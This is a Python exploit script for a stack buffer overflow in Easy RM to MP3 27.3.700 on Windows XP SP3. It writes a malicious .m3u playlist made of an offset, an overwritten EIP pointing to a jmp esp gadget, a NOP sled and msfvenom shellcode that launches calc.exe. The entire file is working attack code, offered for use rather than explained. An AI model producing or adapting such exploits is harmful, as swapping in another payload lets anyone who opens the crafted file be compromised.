#
# Exploit for Easy RM to MP3 27.3.700 vulnerability, discovered by Crazy_Hacker
# Written by Saulo (hycodex) Hachem
# shellterlabs.com
#
# Tested on Windows XP SP3 (En)
#

print("Generating Exploit")

f = open('exploit.m3u', 'w')

offset = "A"*26056
junk = "C"*3744
nops = "\x90"*100
EIP = "\x58\xb0\x01\x10" # !mona jmp -r esp -o

# msfvenom -p windows/exec cmd=calc.exe -f python -b '\x00\xff\x0a'
# Arch: x86 from the payload
# Payload size: 220 bytes
buf =  ""
buf += "\xd9\xe1\xd9\x74\x24\xf4\x5e\x29\xc9\xbf\x1d\x85\xc6"
buf += "\xa2\xb1\x31\x31\x7e\x18\x83\xc6\x04\x03\x7e\x09\x67"
buf += "\x33\x5e\xd9\xe5\xbc\x9f\x19\x8a\x35\x7a\x28\x8a\x22"
buf += "\x0e\x1a\x3a\x20\x42\x96\xb1\x64\x77\x2d\xb7\xa0\x78"
buf += "\x86\x72\x97\xb7\x17\x2e\xeb\xd6\x9b\x2d\x38\x39\xa2"
buf += "\xfd\x4d\x38\xe3\xe0\xbc\x68\xbc\x6f\x12\x9d\xc9\x3a"
buf += "\xaf\x16\x81\xab\xb7\xcb\x51\xcd\x96\x5d\xea\x94\x38"
buf += "\x5f\x3f\xad\x70\x47\x5c\x88\xcb\xfc\x96\x66\xca\xd4"
buf += "\xe7\x87\x61\x19\xc8\x75\x7b\x5d\xee\x65\x0e\x97\x0d"
buf += "\x1b\x09\x6c\x6c\xc7\x9c\x77\xd6\x8c\x07\x5c\xe7\x41"
buf += "\xd1\x17\xeb\x2e\x95\x70\xef\xb1\x7a\x0b\x0b\x39\x7d"
buf += "\xdc\x9a\x79\x5a\xf8\xc7\xda\xc3\x59\xad\x8d\xfc\xba"
buf += "\x0e\x71\x59\xb0\xa2\x66\xd0\x9b\xa8\x79\x66\xa6\x9e"
buf += "\x7a\x78\xa9\x8e\x12\x49\x22\x41\x64\x56\xe1\x26\x9a"
buf += "\x1c\xa8\x0e\x33\xf9\x38\x13\x5e\xfa\x96\x57\x67\x79"
buf += "\x13\x27\x9c\x61\x56\x22\xd8\x25\x8a\x5e\x71\xc0\xac"
buf += "\xcd\x72\xc1\xce\x90\xe0\x89\x3e\x37\x81\x28\x3f"

f.write(offset + EIP + nops + buf + junk)

f.close

print("File Created Successfuly")
